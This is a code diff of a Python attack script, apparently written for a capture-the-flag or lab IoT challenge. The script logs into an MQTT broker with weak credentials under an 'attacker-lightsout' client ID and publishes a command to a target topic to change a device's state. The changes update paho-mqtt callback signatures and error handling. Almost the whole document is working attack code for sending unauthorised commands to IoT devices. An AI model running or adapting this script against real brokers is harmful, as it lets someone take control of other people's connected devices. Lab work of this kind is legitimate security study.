@@ -21,38 +21,40 @@ MQTT_PASSWORD = "iot"         # Password for MQTT
 # Corrected on_connect signature
 def on_connect(client, userdata, flags, rc, properties=None):
     """Callback for connection results."""
+    connack_string = "(Unknown)"
+    try: connack_string = mqtt.connack_string(rc) # Get descriptive string for code
+    except ValueError: pass
     if rc == 0:
         print(f"[+] Connected successfully to MQTT broker: {BROKER_HOST}")
-        # Immediately try to publish after connecting
         publish_command(client)
     else:
-        print(f"[!] MQTT Connection failed with code {rc} ({mqtt.connack_string(rc)}). Check broker details and credentials.")
-        try:
-             client.disconnect()
-             client.loop_stop()
-        except Exception:
-             pass
+        print(f"[!] MQTT Connection failed code {rc} ({connack_string}). Check broker details/credentials.")
+        try: client.disconnect(); client.loop_stop()
+        except Exception: pass
         sys.exit(1)
 
-# *** MODIFIED on_publish signature ***
+# Corrected on_publish signature
 def on_publish(client, userdata, mid, rc, properties=None):
     """Callback when publish completes (for QoS > 0)."""
-    # The 'rc' argument indicates success (0) or failure for the publish acknowledgement (MQTTv5)
-    # Note: For QoS 0, this callback might not fire reliably. For QoS 1/2, it confirms PUBACK/PUBREC.
-    # For simplicity here, we just check mid and assume success if called. A production app might check rc.
+    # rc is new in V2 API, indicating PUBACK reason code (0 usually means success)
     print(f"[+] Command '{COMMAND_PAYLOAD}' publish acknowledged by broker (MID: {mid}, RC: {rc}).")
     print("[*] Check the hidden website for status change!")
-    # Disconnect after successful publish acknowledgement
-    time.sleep(0.5) # Short delay
-    client.disconnect() # This will eventually stop loop_forever
+    time.sleep(0.5)
+    client.disconnect()
 
-# Corrected on_disconnect signature
-def on_disconnect(client, userdata, rc, properties=None):
-    """Callback for disconnections."""
-    if rc == 0:
+# *** MODIFIED on_disconnect signature to accept 5 args ***
+def on_disconnect(client, userdata, flags, reason_code, properties=None):
+    """Callback for disconnections (MQTT v2 signature)."""
+    # reason_code replaced rc for clarity (0 is normal disconnect)
+    # flags might contain disconnect flags (less common usage)
+    if reason_code == 0:
         print("[*] MQTT connection closed gracefully.")
     else:
-        print(f"\n[!] Disconnected unexpectedly from MQTT broker (code: {rc}).")
+        disconnect_string = "(Unknown reason code)"
+        # Try getting reason string (might require newer paho)
+        try: disconnect_string = mqtt.error_string(reason_code)
+        except: pass # Ignore if function not available
+        print(f"\n[!] Disconnected unexpectedly from MQTT broker (Reason Code: {reason_code} - {disconnect_string}).")
     # loop_forever() will exit upon disconnect
 
 
@@ -60,11 +62,10 @@ def publish_command(client):
      """Publishes the command payload to the target topic."""
      print(f"[*] Sending command '{COMMAND_PAYLOAD}' to topic '{TARGET_TOPIC}'...")
      try:
-         # Use QoS 1 to make it more likely the broker receives it and on_publish is called
          result, mid = client.publish(TARGET_TOPIC, payload=COMMAND_PAYLOAD, qos=1)
          if result != mqtt.MQTT_ERR_SUCCESS:
              print(f"[!] Failed to queue publish command locally. Error code: {result}")
-             client.disconnect() # Disconnect on publish failure
+             client.disconnect()
          # Actual success confirmed by on_publish callback
      except Exception as e:
          print(f"[!] Error publishing command: {e}")
@@ -85,7 +86,9 @@ if __name__ == "__main__":
     print(f"[*] Command Payload:  {COMMAND_PAYLOAD}")
 
     try:
+        # Specify V2 explicitly for newer paho-mqtt
         client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id=f"attacker-lightsout-{time.time()}")
+        print("[INFO] Using MQTT Callback API Version 2.")
     except AttributeError:
         print("[INFO] Using older MQTT Callback API Version 1.")
         client = mqtt.Client(client_id=f"attacker-lightsout-{time.time()}")
@@ -106,6 +109,9 @@ if __name__ == "__main__":
          print(f"\n[!] ERROR: Connection refused. Broker might be down or inaccessible.")
     except KeyboardInterrupt:
          print("\n[*] Script interrupted by user.")
+         # Attempt graceful disconnect on Ctrl+C
+         try: client.disconnect()
+         except Exception: pass
     except Exception as e:
         print(f"\n[!] An unexpected error occurred: {e}")
     finally:
